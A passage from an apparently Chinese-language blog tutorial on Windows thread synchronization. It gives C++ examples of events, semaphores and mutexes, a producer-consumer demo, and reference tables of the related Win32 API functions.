class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hEvent = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hEvent = <span class="built_in">CreateEvent</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">//安全属性</span></span><br><span class="line">FALSE,<span class="comment">//TRUE:手工重置   FALSE:自动重置</span></span><br><span class="line">TRUE, <span class="comment">//TRUE:初始为激发态，  FALSE:初始就是非激发态</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件决定顺序"><a href="#事件决定顺序" class="headerlink" title="事件决定顺序"></a>事件决定顺序</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">HANDLE g_hEvent = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WifeProc</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下班了，开始做饭吧&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">HusProc</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下班了，开始吃饭吧&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hEvent = g_hEvent = <span class="built_in">CreateEvent</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">//安全属性</span></span><br><span class="line">FALSE,<span class="comment">//TRUE:手工重置   FALSE:自动重置</span></span><br><span class="line">FALSE, <span class="comment">//TRUE:初始为激发态，  FALSE:初始就是非激发态</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WifeProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, HusProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="信号量："><a href="#信号量：" class="headerlink" title="信号量："></a>信号量：</h4><p> 有信号数这么一个概念，只要信号数不为0，那么就处于激发态。WaitForSignaleObject函数对它的副作用是将信号数减1。</p><p> 最大信号数为1 的信号量，可以认为是一个事件，可以解决互斥问题。</p><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> ReleaseSemaphore</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,  <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LONG lInitialCount,                          <span class="comment">// initial count</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LONG lMaximumCount,                          <span class="comment">// maximum count</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                           <span class="comment">// object name</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function">此函数可用来创建或打开一个信号量，先看参数说明：</span></span><br><span class="line"><span class="function"> lpSemaphoreAttributes：为信号量的属性，一般可以设置为<span class="literal">NULL</span></span></span><br><span class="line"><span class="function"> lInitialCount：信号量初始值，必须大于等于0，而且小于等于 lpMaximumCount，如果lInitialCount 的初始值为0，则该信号量默认为unsignal状态，如果lInitialCount的初始值大于0，则该信号量默认为signal状态，</span></span><br><span class="line"><span class="function"> lMaximumCount： 此值为设置信号量的最大值，必须大于0</span></span><br><span class="line"><span class="function">lpName：信号量的名字，长度不能超出MAX_PATH ，可设置为<span class="literal">NULL</span>，表示无名的信号量。当lpName不为空时，可创建有名的信号量，若当前信号量名与已存在的信号量的名字相同时，则该函数表示打开该信号量，这时参数lInitialCount 和 </span></span><br><span class="line"><span class="function">lMaximumCount 将被忽略。</span></span><br><span class="line"><span class="function">    函数调用成功返回信号量句柄。</span></span><br><span class="line"><span class="function">释放信号量函数：</span></span><br></pre></td></tr></table></figure><p>b. 对于共享资源有序的访问，也可以更关注于要有序。</p><p> 事件和信号量更适合解决有序的问题。因为他们不要求谁上锁，谁开锁。</p><p>用代码实现一个读文件线程，一个写文件线程，请实现先写后读，两个线程都结束之后，主线程结束。</p><p>这种没有过多线程同时访问的有顺序的问题，比较适合用事件来解决。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hSemaphore = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hSemaphore, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(g_hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hSemaphore, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(g_hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">g_hSemaphore = <span class="built_in">CreateSemaphore</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多个信号数的信号量，比较适合解决多个线程之间有顺序需要协调的问题，最为经典的就是生产者消费者问题。</p><p>关键点有两个：</p><p> 1 必须有一个队列，可以有数量限制，也可以没有数量限制。我们考虑的是有数量限制的问题</p><p> 2 每一个生产者是一个线程，每一个消费者也是一个线程。队列满了，生产者需要等待。队列空了，消费者需要等待。</p><p>整个的问题是多线程并发时的协调问题。</p><p>生产者消费者问题，有两个操作</p><p>P：生产</p><p>V：消耗</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line">HANDLE hSemaphoreFull = <span class="number">0</span>;</span><br><span class="line">HANDLE hSemaphoreEmpty = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutex = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutexNum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> g_nNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">class</span> 盖饭</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    盖饭(<span class="type">const</span> <span class="type">char</span> *szName, <span class="type">int</span> nNum) :<span class="built_in">m_Id</span>(nNum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> nSize = <span class="built_in">strlen</span>(szName) + <span class="number">1</span>;</span><br><span class="line">        m_szName = <span class="keyword">new</span> <span class="type">char</span>[nSize];</span><br><span class="line">        <span class="built_in">memset</span>(m_szName, <span class="number">0</span>, nSize);</span><br><span class="line">        <span class="built_in">strcpy_s</span>(m_szName, nSize, szName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetId</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_Id;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> * m_szName;</span><br><span class="line">    <span class="type">int</span> m_Id;</span><br><span class="line">&#125;;</span><br><span class="line">std::vector&lt;盖饭*&gt; g_盖饭表;</span><br><span class="line"><span class="type">int</span> Continue = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//生产者回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Creater</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (Continue)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> nTime = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d号生产者开始做饭,预计%dms\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, nTime);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutexNum, <span class="number">-1</span>);</span><br><span class="line">        g_nNum++;</span><br><span class="line">        盖饭* p = <span class="keyword">new</span> 盖饭(<span class="string">&quot;鱼香肉丝&quot;</span>, g_nNum);</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutexNum);</span><br><span class="line">        <span class="built_in">Sleep</span>(nTime * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d号生产者传菜,菜号为%d\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, p-&gt;<span class="built_in">GetId</span>());</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hSemaphoreEmpty, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutex, <span class="number">-1</span>);</span><br><span class="line">        g_盖饭表.<span class="built_in">push_back</span>(p);</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphoreFull, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//消费者回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">User</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (Continue)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hSemaphoreFull, <span class="number">-1</span>);</span><br><span class="line">        <span class="type">int</span> nTime = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">Sleep</span>(nTime * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutex, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;                              %d号消费者取走了%d号饭,耗时%dms\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, g_盖饭表[<span class="number">0</span>]-&gt;<span class="built_in">GetId</span>(), nTime);</span><br><span class="line">        g_盖饭表.<span class="built_in">erase</span>(g_盖饭表.<span class="built_in">begin</span>());</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphoreEmpty, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hSemaphoreFull = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hSemaphoreEmpty = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    hMutexNum = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hThread[<span class="number">20</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//9个生产者</span></span><br><span class="line">    hThread[<span class="number">0</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">2</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">3</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">4</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">5</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">6</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">7</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">8</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">9</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//4个消费者</span></span><br><span class="line">    hThread[<span class="number">10</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">11</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">12</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">13</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(<span class="number">14</span>, hThread, TRUE, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>原子操作，只能保证对于基本算数操作是原子性的。</p><p>临界区和互斥体从词语的含义上看，他们主要就是为了解决互斥问题。</p><p>临界区的优点是快。互斥体的优点是能够跨进程访问，崩溃不死锁。</p><p>事件 从词语的含义上看，更适合做通知（产生了一个事件）。比较适合解决有先后顺序的多线程问题。</p><p>事件和互斥体的最大区别，就是线程所有权。互斥体谁上锁，谁开锁。事件没有这个要求。</p><p>信号量，由于存在信号数的问题，比较适合解决多线程的协调问题。典型问题，就是生产者消费者问题。</p><h3 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h3><p>原子操作：</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>InterlockedIncrement</td><td>自增</td><td>InterlockedIncrement(&amp;g_count)</td></tr><tr><td>InterlockedDecrement</td><td>自减</td><td>InterlockedDecrement(&amp;g_count);</td></tr><tr><td>InterlockedExchangeAdd</td><td>加法/减法</td><td>InterlockedExchangeAdd(&amp;g_count, 256L);</td></tr><tr><td>InterlockedExchange</td><td>赋值</td><td>InterlockedExchange(&amp;g_count, 256L);</td></tr></tbody></table></div><p>临界区</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>InitializeCriticalSection</td><td>初始化</td><td></td></tr><tr><td>DeleteCriticalSection</td><td>销毁</td><td></td></tr><tr><td>EnterCriticalSection</td><td>进入临界区</td><td></td></tr><tr><td>LeaveCriticalSection</td><td>离开临界区</td></tr></tbody></table></div><p>互斥体</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateMutex</td><td>创建互斥体</td><td>可以给互斥体起名字</td></tr><tr><td>OpenMutex</td><td>打开互斥体，得到句柄</td><td>根据名字才能打开互斥体</td></tr><tr><td>ReleaseMutex</td><td>释放互斥体</td><td>会使得互斥体处于激发态</td></tr><tr><td>CloseHandle</td><td>关闭句柄</td><td>使用完后关闭</td></tr><tr><td>WaitForSignalObject</td><td>等待互斥体处于激发态</td><td>等到激发态后，会使得互斥体再次处于非激发态</td></tr></tbody></table></div><p>事件</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateEvent</td><td>创建事件</td><td>可以给事件起名字 可以设置两种模式：手工 自动</td></tr><tr><td>OpenEvent</td><td>打开事件，得到句柄</td><td>根据名字才能打开事件</td></tr><tr><td>SetEvent</td><td>释放事件</td><td>会使得事件处于激发态</td></tr><tr><td>ResetEvent</td><td>重置事件</td><td>会使得事件处于非激发态，对手工模式的事件有效</td></tr><tr><td>WaitForSignalObject</td><td>等待事件处于激发态</td><td>等到激发态后，对于自动模式的事件会使其再次处于非激发态</td></tr></tbody></table></div><p>信号量</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateSemaphore</td><td>创建信号量</td><td>可以给信号量起名字 可以指定最大信号数和当前信号数</td></tr><tr><td>OpenSemaphore</td><td>打开信号量</td><td>根据名字才能打开信号量</td></tr><tr><td>ReleaseSemaphore</td><td>释放信号量</td><td>会增加信号量的信号数，但是不会超过最大信号数</td></tr><tr><td>WaitForSignalObject</td><td>等待信号量处于激发态</td><td>若处于激发态，则会减少1个信号数，信号数位0，将其置为非激发态</td></tr></tbody></table></div><h1 id="九、文件操作"><a href="#九、文件操作" class="headerlink" title="九、文件操作"></a>九、文件操作</h1><div 